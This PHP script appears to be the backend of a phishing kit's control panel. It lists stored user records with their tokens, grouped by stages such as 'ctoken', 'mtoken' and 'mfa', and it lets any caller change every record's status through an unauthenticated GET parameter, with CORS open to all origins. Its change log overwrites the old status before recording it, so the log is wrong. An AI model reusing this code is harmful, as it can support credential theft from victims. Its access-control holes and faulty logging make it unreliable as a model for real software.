<?php

$base_path = '../../users/';

function get_json_files($folder) {
    $files = glob("$folder/*.json");
    return $files;
}

function read_json_file($file) {
    $json_content = file_get_contents($file);
    return json_decode($json_content, true);
}

function save_json_file($file, $data) {
    $json_data = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($file, $json_data);
}

function log_changes($log_file, $changes) {
    $log_entry = date('Y-m-d H:i:s') . ": " . json_encode($changes) . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}

if (isset($_GET['users']) && $_GET['users'] === '!') {
    $json_response = array(
        "inicio" => array(),
        "ctoken" => array(),
        "ltoken" => array(),
        "mtoken" => array(),
        "mfa" => array(),
        "finished" => array(),
        "leave" => array(),
        "finished" => array(),
        "banned" => array(),
        
        "striked" => array()
    );

    $json_files = get_json_files($base_path);

    foreach ($json_files as $json_file) {
        $file_name = basename($json_file, '.json');
        $json_data = read_json_file($json_file);

        // Validate JSON format
        if (!isset($json_data["status"]) || !isset($json_data["token"])) {
            continue; // Skip this file if essential keys are missing
        }

        // Determine group based on status
        switch ($json_data["status"]) {
            case "inicio":
                $group = "inicio";
                break;
            case "ctoken":
                $group = "ctoken";
                break;
            case "ltoken":
                $group = "ltoken";
                break;
            case "mtoken":
                $group = "mtoken";
                break;
            case "mfa":
                $group = "mfa";
                break;
            case "finished":
                $group = "finished";
                break;
            case "leave":
                $group = "leave";
                break;
            case "banned":
                $group = "banned";
                break;
            case "striked":
                $group = "striked";
                break;
            default:
                $group = "unknown";
        }

        // Define the structure for output (excluding "ip")
        $output_data = array(
            "token" => $json_data["token"],
            "status" => $json_data["status"]
        );

        // Log changes if status is modified
        if (isset($_GET['status']) && $json_data["status"] !== $_GET['status']) {
            $json_data["status"] = $_GET['status'];
            log_changes('../../logs/status_changes.log', array(
                "token" => $json_data["token"],
                "old_status" => $json_data["status"],
                "new_status" => $_GET['status']
            ));
            save_json_file($json_file, $json_data); // Save updated JSON data
        }

        // Add to appropriate group in response
        $json_response[$group][] = $output_data;
    }

    // Remove empty groups
    $json_response = array_filter($json_response);

    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET');
    header('Access-Control-Allow-Headers: Content-Type');
    header('Content-Type: application/json');
    echo json_encode($json_response);
} else {
    header("HTTP/1.0 400 Bad Request");
    echo json_encode(array("error" => "Parámetro ?users=! no encontrado"));
}

